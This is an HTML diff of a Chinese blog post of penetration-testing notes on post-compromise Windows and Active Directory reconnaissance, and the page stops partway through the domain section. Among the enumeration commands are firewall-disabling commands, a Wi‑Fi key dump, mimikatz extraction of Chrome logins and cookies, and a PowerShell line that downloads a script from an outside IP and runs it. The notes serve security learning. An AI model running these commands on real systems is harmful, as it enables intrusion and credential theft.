@@ -1,0 +1,710 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Windows内网信息收集 - ZXQ!!!</title><link rel="apple-touch-icon" href="/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/images/favicons/manifest.json">
+<link rel="icon" href="/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="Windows内网信息收集">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-04-23T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2023-04-23T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="3813">
+<meta itemprop="keywords" content="," /><meta property="og:title" content="Windows内网信息收集" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tech/intranet/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-23T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-04-23T00:00:00&#43;00:00" /><meta property="og:site_name" content="ZXQ!!!" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Windows内网信息收集"/>
+<meta name="twitter:description" content=""/>
+<meta data-name="palette" content="blue"><link rel=stylesheet href="/css/bundle.min.9819e4e2411e150748363de90ec254ddcda514cc29bb1238a532433adb77735b.css" integrity="sha256-mBnk4kEeFQdINj3pDsJU3c2lFMwpuxI4pTJDOtt3c1s=" crossorigin="anonymous"><script src="/js/bundle.min.e32615bc744413570374d5b28e8c02ec03c7b28c31485b6fcc5b6174a08766d9.js" integrity="sha256-4yYVvHREE1cDdNWyjowC7APHsowxSFtvzFthdKCHZtk=" crossorigin="anonymous"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js"></script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js"> </script>
+<script type="text/javascript">
+	document.addEventListener("DOMContentLoaded", function() {
+  renderMathInElement(document.body, {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}
+    ],
+    macros: {
+      "\\ge": "\\geqslant",
+      "\\le": "\\leqslant",
+      "\\geq": "\\geqslant",
+      "\\leq": "\\leqslant"
+	}
+  });
+}); 
+</script>
+<meta property="og:type" content="index"/>
+<meta property="og:title" content="Unzybaryl`s Sekai" />
+<meta property="og:image" content="https://eustia.me/images/profile1.jpg" />
+<meta property="og:url" content="https://eustia.me/" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/flatblowfish/cave-draw/dist/cave-draw.min.js"></script></head><body><header><nav class="navbar navbar-expand-xl fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      
+      ティアなのです！
+      
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-1 mb-2 mb-lg-0"><form class="search-bar d-flex ms-1" action="/search">
+  <div class="input-group input-group-sm">
+    <button class="btn btn-search disabled position-absolute left-0" type="submit"><i class="fas fa-fw fa-search"></i></button>
+    <input class="form-control rounded-pill" id="searchQuery" name="q" type="search" aria-label="Search">
+  </div>
+</form></ul><ul class="navbar-nav me-1 mb-2 mb-lg-0 me-1 ms-auto"><li class="nav-item">
+          <a class="nav-link" href="/archives">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/bin/">
+            <i class="fas fa-fw fa-bookmark "></i>废案
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/posts/tech/">
+            <i class="fas fa-fw fa-star"></i>技术
+          </a>
+        </li><li class="nav-item">
+  <a class="nav-link" data-bs-toggle="offcanvas" href="#offcanvasSettings" role="button"
+    aria-controls="offcanvasSettings">
+    <i class="fas fa-fw fa-sliders-h"></i> 设置
+  </a>
+</li>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings"
+  aria-labelledby="offcanvasSettingsLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" w id="offcanvasSettingsLabel"><i class="fas fa-fw fa-sliders-h"></i> 设置</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body"><section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+</div>
+</div></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row" aria-label="breadcrumb">
+  <ol class="breadcrumb surface"><li class="breadcrumb-item"><a href="/">主页</a></li><li class="breadcrumb-item"><a href="/posts/">文章</a></li><li class="breadcrumb-item"><a href="/posts/tech/">Tech</a></li><li class="breadcrumb-item active">Windows内网信息收集</li></ol>
+</nav><article class="post row surface"><div class="post-panel-wrapper">
+  <div class="post-panel d-flex flex-column">
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt fa-rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0"
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a id="btnTOC" class="fas fa-fw fa-list-alt" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+</a>
+  </div>
+</div>
+<h1 class="post-title my-3">Windows内网信息收集
+</h1><div class="post-meta mb-3">
+  <span class="post-date me-2">
+    <i class="fas fa-fw fa-calendar-alt"></i>2023-04-23
+  </span>
+  <span class="post-reading-time me-2">
+    <i class="fas fa-fw fa-coffee"></i>8 分钟阅读
+  </span>
+<a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy">#打怪升级</a></div>
+
+
+
+                
+                <div class="addthis_inline_share_toolbox"></div>
+            <div class="offcanvas offcanvas-end surface" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#内网windows信息收集">内网Windows信息收集</a>
+      <ul>
+        <li><a href="#01内网基础环境分析">01内网基础环境分析</a></li>
+        <li><a href="#02本机信息收集">02本机信息收集</a></li>
+        <li><a href="#03内网网段信息收集">03内网网段信息收集</a></li>
+        <li><a href="#04用户信息">04用户信息</a></li>
+        <li><a href="#05-系统信息">05 系统信息</a></li>
+        <li><a href="#06网络信息">06网络信息</a></li>
+        <li><a href="#07防火墙信息">07防火墙信息</a></li>
+        <li><a href="#08代理信息">08代理信息</a></li>
+        <li><a href="#09wifi密码">09Wifi密码</a></li>
+        <li><a href="#10回收站内容获取">10回收站内容获取</a></li>
+        <li><a href="#11chrome历史记录和cookie获取">11Chrome历史记录和Cookie获取</a></li>
+        <li><a href="#12powershell">12Powershell</a></li>
+        <li><a href="#13msf信息收集">13MSF信息收集</a></li>
+      </ul>
+    </li>
+    <li><a href="#域内信息收集">域内信息收集</a>
+      <ul>
+        <li><a href="#01域简介">01域简介</a></li>
+        <li><a href="#02net组件">02Net组件</a></li>
+        <li><a href="#03dsquery">03dsquery</a></li>
+        <li><a href="#04other">04Other</a></li>
+        <li><a href="#05定位域控">05定位域控</a></li>
+      </ul>
+    </li>
+    <li><a href="#内网存活探测">内网存活探测</a>
+      <ul>
+        <li><a href="#01netbios协议探测">01Netbios协议探测</a></li>
+        <li><a href="#02icmp协议探测">02ICMP协议探测</a></li>
+        <li><a href="#03udp协议探测">03UDP协议探测</a></li>
+        <li><a href="#04arp协议探测">04ARP协议探测</a></li>
+        <li><a href="#05smb协议探测">05SMB协议探测</a></li>
+        <li><a href="#06域内端口探测">06域内端口探测</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3" ><h2 id="内网windows信息收集">内网Windows信息收集</h2>
+<h3 id="01内网基础环境分析">01内网基础环境分析</h3>
+<ul>
+<li>
+<p>基础环境判断：IP，网关，DNS，能否连通外网，网络连接和端口，本机host文件，机器的代理，是否在域内，域名是什么</p>
+</li>
+<li>
+<p>机器所处的位置区域：DMZ区，办公区，生产区，核心DB等</p>
+</li>
+<li>
+<p>机器的角色：普通WEB服务器，开发服务器，文件服务器，代理服务器，DNS服务器，数据存储服务器等</p>
+</li>
+<li>
+<p>进出口流量是否能连通（1.协议判断 2.端口判断）</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln"> 1</span><span class="c1">#TCP</span>
+<span class="ln"> 2</span>vps: nc -lvvp <span class="m">8888</span>
+<span class="ln"> 3</span>target: nc vps-ip <span class="m">8888</span>
+<span class="ln"> 4</span>  
+<span class="ln"> 5</span><span class="c1">#HTTP</span>
+<span class="ln"> 6</span>vps: nc -lvvp <span class="m">80</span>
+<span class="ln"> 7</span>target: curl vps-ip <span class="m">80</span>
+<span class="ln"> 8</span>  
+<span class="ln"> 9</span><span class="c1">#ICMP</span>
+<span class="ln">10</span>vps: tcpdump icmp
+<span class="ln">11</span>target: ping vps-ip
+<span class="ln">12</span>  
+<span class="ln">13</span><span class="c1">#DNS</span>
+<span class="ln">14</span>vps: nc -u -lvp <span class="m">53</span>
+<span class="ln">15</span>target:
+<span class="ln">16</span>nslookup www.baidu.com vps-ip
+<span class="ln">17</span>dig @vps-ip www.baidu.com
+</code></pre></div></li>
+</ul>
+<h3 id="02本机信息收集">02本机信息收集</h3>
+<p>具体指令在下面的具体环节补充。</p>
+<p>操作系统，权限，内网IP地址段，杀软，端口，服务，补丁情况，网络环境情况，共享，会话等。域内主机一遍操作系统，应用软件，补丁，服务，杀软都是批量安装的。</p>
+<p>纵向移动：机器有多个网卡，从一个ip段移动到另一个ip段（192.168.*到10.10.*）只有找到不同网段才能纵向渗透，否则只能横向了。</p>
+<h3 id="03内网网段信息收集">03内网网段信息收集</h3>
+<ol>
+<li>内网网段扫描</li>
+<li>文件共享，FTP连接记录，浏览器访问记录，mstsc连接记录</li>
+<li>渗透路由器，交换机</li>
+</ol>
+<h3 id="04用户信息">04用户信息</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#本机用户列表</span>
+<span class="ln"> 2</span><span class="n">net</span> <span class="n">user</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#本地管理员信息</span>
+<span class="ln"> 5</span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#当前在线用户</span>
+<span class="ln"> 8</span><span class="n">quser</span>
+<span class="ln"> 9</span><span class="n">query</span> <span class="n">user</span>
+<span class="ln">10</span><span class="n">query</span> <span class="n">user</span> <span class="p">||</span> <span class="n">qwinsta</span>
+<span class="ln">11</span>
+<span class="ln">12</span><span class="c">#当前用户在目标系统的具体权限</span>
+<span class="ln">13</span><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+<span class="ln">14</span>
+<span class="ln">15</span><span class="c">#查看当前权限</span>
+<span class="ln">16</span><span class="n">whoami</span> <span class="p">&amp;&amp;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+<span class="ln">17</span>
+<span class="ln">18</span><span class="c">#当前机器的所有组名，了解不同组的职能</span>
+<span class="ln">19</span><span class="n">net</span> <span class="n">localgroup</span>
+</code></pre></div><h3 id="05-系统信息">05 系统信息</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#查询网络配置信息，进行ip地址段信息收集</span>
+<span class="ln"> 2</span><span class="n">ipconfig</span> <span class="p">/</span><span class="n">all</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#查询操作系统及软件信息</span>
+<span class="ln"> 5</span><span class="n">systeminfo</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">B</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;OS NAME&#34;</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;OS Version&#34;</span> <span class="c">#英文系统</span>
+<span class="ln"> 6</span><span class="n">systeminfo</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">B</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;OS 名称&#34;</span> <span class="p">/</span><span class="n">C:</span><span class="s2">&#34;OS 版本&#34;</span> <span class="c">#中文系统</span>
+<span class="ln"> 7</span><span class="c">#findstr中 /B是正则匹配 /C是指定内容</span>
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="c">#查看当前系统版本</span>
+<span class="ln">10</span><span class="n">wmic</span> <span class="n">OS</span> <span class="n">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">CSDVersion</span><span class="p">,</span><span class="n">OSArchitecture</span><span class="p">,</span><span class="n">Version</span>
+<span class="ln">11</span>
+<span class="ln">12</span><span class="c">#查看系统体系结构</span>
+<span class="ln">13</span><span class="nb">echo </span><span class="k">%</span><span class="n">PROCESSOR_ARCHITECTURE</span><span class="p">%</span>
+<span class="ln">14</span>
+<span class="ln">15</span><span class="c">#查看本机服务信息</span>
+<span class="ln">16</span><span class="n">wmic</span> <span class="n">service</span> <span class="n">list</span> <span class="n">brief</span>
+<span class="ln">17</span>
+<span class="ln">18</span><span class="c">#查看安装的软件的版本、路径等</span>
+<span class="ln">19</span><span class="n">wmic</span> <span class="n">product</span> <span class="n">get</span> <span class="n">name</span><span class="err">，</span><span class="n">version</span>
+<span class="ln">20</span><span class="n">powershell</span> <span class="err">”</span><span class="nb">Get-WmiObject</span> <span class="n">-class</span> <span class="n">Win32_Product</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Property</span> <span class="n">name</span><span class="p">,</span><span class="n">version</span><span class="s2">&#34;
+</span><span class="ln">21</span><span class="s2">
+</span><span class="ln">22</span><span class="s2">#查询进程信息
+</span><span class="ln">23</span><span class="s2">tasklist
+</span><span class="ln">24</span><span class="s2">wmic process list brief
+</span><span class="ln">25</span><span class="s2">
+</span><span class="ln">26</span><span class="s2">#查看计划任务
+</span><span class="ln">27</span><span class="s2">at（win10前）
+</span><span class="ln">28</span><span class="s2">schtasks /query /fo LIST /v (win10)
+</span><span class="ln">29</span><span class="s2">
+</span><span class="ln">30</span><span class="s2">#查看主机开机时间
+</span><span class="ln">31</span><span class="s2">net statistics workstation
+</span><span class="ln">32</span><span class="s2">
+</span><span class="ln">33</span><span class="s2">#列出或断开本地计算机与所连接的客户端的对话
+</span><span class="ln">34</span><span class="s2">net session
+</span><span class="ln">35</span><span class="s2">
+</span><span class="ln">36</span><span class="s2">#查看远程连接信息
+</span><span class="ln">37</span><span class="s2">cmdkey /l
+</span><span class="ln">38</span><span class="s2">
+</span><span class="ln">39</span><span class="s2">#查看补丁列表
+</span><span class="ln">40</span><span class="s2">systeminfo | findstr KB
+</span><span class="ln">41</span><span class="s2">
+</span><span class="ln">42</span><span class="s2">#查看补丁名称、描述、ID、安装时间
+</span><span class="ln">43</span><span class="s2">wmic qfe get Caption,Description,HotFixID,InstalledOn
+</span><span class="ln">44</span><span class="s2">
+</span><span class="ln">45</span><span class="s2">#查看杀软
+</span><span class="ln">46</span><span class="s2">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+</span><span class="ln">47</span><span class="s2">
+</span><span class="ln">48</span><span class="s2">#查看本地密码策略
+</span><span class="ln">49</span><span class="s2">net accounts
+</span><span class="ln">50</span><span class="s2">
+</span><span class="ln">51</span><span class="s2">#查看hosts文件
+</span><span class="ln">52</span><span class="s2">Linux: cat /etc/hosts
+</span><span class="ln">53</span><span class="s2">Windows: type c:\windows\system32\drivers\etc\hosts
+</span><span class="ln">54</span><span class="s2">
+</span><span class="ln">55</span><span class="s2">#查看dns缓存
+</span><span class="ln">56</span><span class="s2">ipconfig /displaydns
+</span></code></pre></div><h3 id="06网络信息">06网络信息</h3>
+<p>挂载磁盘，需要知道别人的用户名和密码。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#查看本机所有的TCP，UDP端口连接及其对应的pid</span>
+<span class="ln"> 2</span><span class="n">netstat</span> <span class="n">-ano</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#查看本机所有的TCP，UDP端口连接，pid及其对应的发起程序</span>
+<span class="ln"> 5</span><span class="n">netstat</span> <span class="n">-anob</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#查看路由表和arp缓存</span>
+<span class="ln"> 8</span><span class="n">route</span> <span class="n">print</span>
+<span class="ln"> 9</span><span class="n">arp</span> <span class="n">-a</span>
+<span class="ln">10</span>
+<span class="ln">11</span><span class="c">#查看本机共享列表和可访问的域共享列表</span>
+<span class="ln">12</span><span class="n">net</span> <span class="n">share</span>
+<span class="ln">13</span><span class="n">wmic</span> <span class="n">share</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">path</span><span class="p">,</span><span class="n">status</span>
+<span class="ln">14</span>
+<span class="ln">15</span><span class="c">#磁盘映射</span>
+<span class="ln">16</span><span class="n">net</span> <span class="n">use</span> <span class="n">k:</span><span class="p">\\</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</code></pre></div><h3 id="07防火墙信息">07防火墙信息</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#关闭防火墙（winserver2003前）</span>
+<span class="ln"> 2</span><span class="n">netsh</span> <span class="n">firewall</span> <span class="nb">set </span><span class="n">opmode</span> <span class="n">disable</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#关闭防火墙（2003以后）</span>
+<span class="ln"> 5</span><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="nb">set </span><span class="n">allprofiles</span> <span class="n">state</span> <span class="n">off</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#查看防火墙配置（netsh命令也可以作端口转发）</span>
+<span class="ln"> 8</span><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">config</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span><span class="c">#查看配置规则</span>
+<span class="ln">11</span><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">rule</span> <span class="n">name</span><span class="p">=</span><span class="n">all</span>
+</code></pre></div><h3 id="08代理信息">08代理信息</h3>
+<p>内网机器可能通过内网代理进入内网。代理信息可能文件保存，注册表保存。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="n">REG</span> <span class="n">QUERY</span> <span class="s2">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">ProxyServer</span>
+<span class="ln">2</span>
+<span class="ln">3</span><span class="c">#通过pac文件自动代理的情况</span>
+<span class="ln">4</span><span class="n">REG</span> <span class="n">QUERY</span> <span class="s2">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">AutoConfigURL</span>
+</code></pre></div><h3 id="09wifi密码">09Wifi密码</h3>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profile</span>
+<span class="ln">2</span><span class="n">netsh</span> <span class="n">wlan</span> <span class="n">show</span> <span class="n">profile</span> <span class="n">name</span><span class="p">=</span><span class="s2">&#34;vivo Z5x&#34;</span> <span class="n">key</span><span class="p">=</span><span class="nb">clear
+</span></code></pre></div><h3 id="10回收站内容获取">10回收站内容获取</h3>
+<p>$I开头的文件保存的是路径信息，$R开头的文件保存的是文件信息。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="k">FOR</span> <span class="p">/</span><span class="n">f</span> <span class="s2">&#34;skip=1 tokens=1,2 delim= &#34;</span> <span class="k">%</span><span class="n">c</span> <span class="k">in</span> <span class="p">(</span><span class="s1">&#39;wmic useraccount get name^,sid&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="nb">dir </span><span class="p">/</span><span class="n">a</span> <span class="p">/</span><span class="n">b</span> <span class="n">C:</span><span class="p">\</span><span class="nv">$Recycle</span><span class="p">.</span><span class="n">Bin</span><span class="p">\</span><span class="k">%</span><span class="n">d</span><span class="p">\</span> <span class="p">^&gt;</span><span class="k">%</span><span class="n">c</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div><h3 id="11chrome历史记录和cookie获取">11Chrome历史记录和Cookie获取</h3>
+<p>chrome的用户信息，保存在本地文件为sqlite数据库格式。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="k">%</span><span class="n">localappdata</span><span class="p">%\</span><span class="n">google</span><span class="p">\</span><span class="n">chrome</span><span class="p">\</span><span class="n">USERDA</span><span class="p">~</span><span class="n">1</span><span class="p">\</span><span class="k">default</span><span class="p">\</span><span class="n">LOGIND</span><span class="p">~</span><span class="n">1</span>
+<span class="ln">2</span><span class="k">%</span><span class="n">localappdata</span><span class="p">%\</span><span class="n">google</span><span class="p">\</span><span class="n">chrome</span><span class="p">\</span><span class="n">USERDA</span><span class="p">~</span><span class="n">1</span><span class="p">\</span><span class="k">default</span><span class="p">\</span><span class="n">cookies</span>
+<span class="ln">3</span>
+<span class="ln">4</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="n">log</span><span class="s2">&#34;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&#34;</span> <span class="n">exit</span>
+<span class="ln">5</span>
+<span class="ln">6</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="n">log</span><span class="s2">&#34;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies&#34;</span> <span class="p">/</span><span class="n">unprotect</span> <span class="n">exit</span>
+</code></pre></div><h3 id="12powershell">12Powershell</h3>
+<p>FTP访问、共享连接、putty连接、驱动、应用程序、hosts文件、进程、无线网络记录。</p>
+<p>downloadstring加载文件到内存执行。</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln">1</span><span class="n">powershell</span> <span class="n">iex</span><span class="p">(</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://39.108.68.207:8000/Get-Information&#39;</span><span class="p">)</span>
+<span class="ln">2</span>
+<span class="ln">3</span><span class="n">Nishang-Gather-Get-Information</span><span class="p">.</span><span class="n">ps1</span>
+<span class="ln">4</span>
+<span class="ln">5</span><span class="c">#远程vps开启监听：</span>
+<span class="ln">6</span><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">开启80端口快速服务器</span> 
+<span class="ln">7</span><span class="n">python2</span> <span class="n">SimpleHTTPServer</span>
+</code></pre></div><h3 id="13msf信息收集">13MSF信息收集</h3>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>run scraper
+<span class="ln">2</span>/root/.msf4/logs/scripts/scraper
+</code></pre></div><h2 id="域内信息收集">域内信息收集</h2>
+<h3 id="01域简介">01域简介</h3>
+<p>域(domain):域是一个有安全边界的计算机集合
+安全边界:在两个域中，一个域中的用户无法访问另一个域中的资源。</p>
+<p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p>
+<p>域成员计算机在登录的时候可以选择登录到域中或此计算机。</p>
+<p>登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的。登陆到此计算机时，是通过SAM来进行NTLM验证的。</p>
+<p>默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中</p>
+<p>域控:DC(Domain Control)
+在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑互相访问首先都得经过它的审核。</p>
+<p>域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能要有至少两个域控。-DC，一个是备份DC。</p>
+<p>活动目录:AD(Active Directory)</p>
+<ul>
+<li>域环境中提供目录服务的组件;</li>
+<li>在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存;</li>
+<li>活动目录存储着有关网络对象的信息，如用户、组、计算机、共享资源、打印机和联系人等;</li>
+<li>安装有AD活动目录的服务器就是域控DC。</li>
+</ul>
+<p>用户可以通过AD活动目录定位到内网中的资源位置。</p>
+<p>活动目录主要功能:</p>
+<ul>
+<li>帐号集中管理:所有帐号均存在服务器上，方便对帐号的重命名/重置密码。</li>
+<li>软件集中管理:统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件可以让用户自由选择安装软件。</li>
+<li>环境集中管理:利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li>
+<li>增强安全性:统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络一管理。</li>
+<li>更可靠:更少的宕机时间。如:利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，宕机时间更少。</li>
+</ul>
+<p>活动目录为Microsoft统一管理的基础平台，其它ISA、Exchange、SMS等服务都依赖于这个基础平台。</p>
+<h3 id="02net组件">02Net组件</h3>
+<p>whoami前面是域名。域控制器最重要，拿到域控后可以执行dsquery</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="ln"> 1</span><span class="c">#查询域</span>
+<span class="ln"> 2</span><span class="n">net</span> <span class="n">view</span> <span class="p">/</span><span class="n">domain</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c">#查询域内的所有计算机</span>
+<span class="ln"> 5</span><span class="n">net</span> <span class="n">view</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">de1ay</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c">#查询域内所有用户组(Enterprise Admins组权限最大)</span>
+<span class="ln"> 8</span><span class="n">net</span> <span class="nb">group </span><span class="p">/</span><span class="n">domain</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span><span class="c">#查看域管理员的用户组</span>
+<span class="ln">11</span><span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;domain admins&#34;</span> <span class="p">/</span><span class="n">domain</span>
+<span class="ln">12</span>
+<span class="ln">13</span><span class="c">#查询所有域成员计算机列表</span>
+<span class="ln">14</span><span class="n">net</span> <span class="nb">group </span><span class="s2">&#34;domain computers&#34;</span> <span class="p">/</span><span class="n">domain</span>
+<span class="ln">15</span>
+<span class="ln">16</span><span class="c">#查询域系统管理员用户组</span>
